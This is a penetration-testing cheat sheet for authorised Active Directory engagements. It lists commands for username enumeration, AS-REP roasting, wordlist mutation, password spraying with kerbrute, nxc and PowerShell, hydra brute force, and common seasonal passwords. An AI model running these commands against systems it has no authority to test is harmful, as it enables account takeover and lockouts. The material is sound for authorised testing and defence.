---
title: "Brute force & username enumeration"
date: 2026-05-31
updated: 2026-05
tags: [active-directory, password-spray, username-enumeration, wordlists, kerberos]
summary: >-
  Username enumeration, wordlist preparation, and password spraying
  for authorised AD engagements — built around the domain password
  policy as the gate that keeps it safe.
---

> Scope: for **authorised** testing only. Spraying without first
> knowing the domain lockout threshold will lock out real accounts.
> The order of sections below is the order you should work in.

## 1. Domain password policy — read this first

The lockout threshold and reset window in the policy is what keeps a
spray from becoming a denial-of-service. Always enumerate this before
any spray.

```bash
nxc smb <dc-ip> -u <user> -p '<password>' -d <domain> --pass-pol
```

On misconfigured domains a null session can work — try `-u '' -p ''`
before you have any credentials.

## 2. Username enumeration

### Generate candidates from a name list

If you have a list of real names (LinkedIn scrape, company website,
conference attendees), generate usernames in the conventions the target
directory is likely to use:

```bash
./username-anarchy --input-file ./names.txt --select-format first.last
```

Common formats to try in sequence: `first.last`, `flast`, `firstl`,
`f.last`, `firstlast`.

### Kerberos pre-auth enumeration

Kerberos's AS-REQ response differs for valid vs invalid usernames — no
credentials needed. `kerbrute` is the current standard:

```bash
kerbrute userenum --dc <dc-ip> -d <domain> users.txt
```

Or the nmap NSE variant:

```bash
nmap -p 88 --script krb5-enum-users \
     --script-args krb5-enum-users.realm='<domain>' <dc-ip>
```

### RID brute via SAMR

If you can reach SMB with any (even guest) account, walk the RIDs:

```bash
nxc smb <dc-ip> -u <user> -p '<password>' --rid-brute
```

### AS-REP roasting candidates

Users with *Do not require Kerberos pre-authentication* set will hand
out an AS-REP you can crack offline. Request hashes for a username list
in one shot:

```bash
impacket-GetNPUsers <domain>/ -dc-ip <dc-ip> \
    -usersfile users.txt -format hashcat -outputfile asrep.hashes
```

## 3. Wordlist preparation

### Rule-based mutation of a base list

Apply hashcat rules to expand a base wordlist before spraying:

```bash
hashcat --stdout /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule > custom.txt
```

`best64.rule` is a quick win. `dive.rule` is more aggressive and
noisier — useful for offline cracking, overkill for spraying.

### Scrape candidates from the target's site

Pull words from a public-facing site for a target-specific wordlist —
product names, slogans, founders' names, dates:

```bash
cewl https://target.example -w site-words.txt   # words to file
cewl https://target.example -e -n                # extract emails, no count
```

### Custom hashcat rules

Stack mutations like capitalisation and year/symbol suffixes:

```
c $2 $0 $2 $6 $!
c $2 $0 $2 $6 $@
c $2 $0 $2 $6 $#
$S $u $m $m $e $r $2 $0 $2 $6
```

`c` capitalises the first character. `$X` appends the literal X. Full
reference: <https://hashcat.net/wiki/doku.php?id=rule_based_attack>

Test your rule against a small wordlist before running at scale:

```bash
hashcat --stdout ./wordlist -r ./custom.rule
```

## 4. Password spraying

**Rules of safety.** One password per round across the whole user
list. Then wait outside the lockout reset window before the next
round. **Never** run a wordlist against a single AD user — that's
bruteforce and locks the account.

### Kerberos-based spray (typically quieter than SMB)

```bash
kerbrute passwordspray --dc <dc-ip> -d <domain> users.txt 'Spring2026!'
```

### SMB-based spray

```bash
nxc smb <dc-ip> -u ./users.txt -p 'Spring2026!' \
    --no-bruteforce --continue-on-success
```

`--no-bruteforce` pairs each user with the *same* password (1:1) rather
than every-user × every-password. `--continue-on-success` keeps going
after a hit so you don't miss other valid accounts.

### PowerShell variant (from a domain-joined host)

```powershell
Invoke-DomainPasswordSpray -Password 'Spring2026!' -OutFile output.txt
```

### Candidates worth trying

`Welcome1`, `Welcome01`, `<Season><Year>!` (e.g. `Spring2026!`),
`<CompanyName>123`, `Password123`. Combine with the policy you read in
step 1 to know how many rounds the lockout budget allows you.

## 5. Single-user brute force

When you have a username and a service to attack (FTP, SSH, single
web login) — not for AD accounts unless lockout is explicitly disabled.

```bash
hydra -l <user> -P passlist.txt ftp://<target>
```

### Web form

```bash
hydra -L users.txt -P passwords.txt -f <target> -s <port> \
    http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

`F=...` is the failure marker the server returns on a wrong attempt.
Tune it to whatever the target actually returns when login fails.
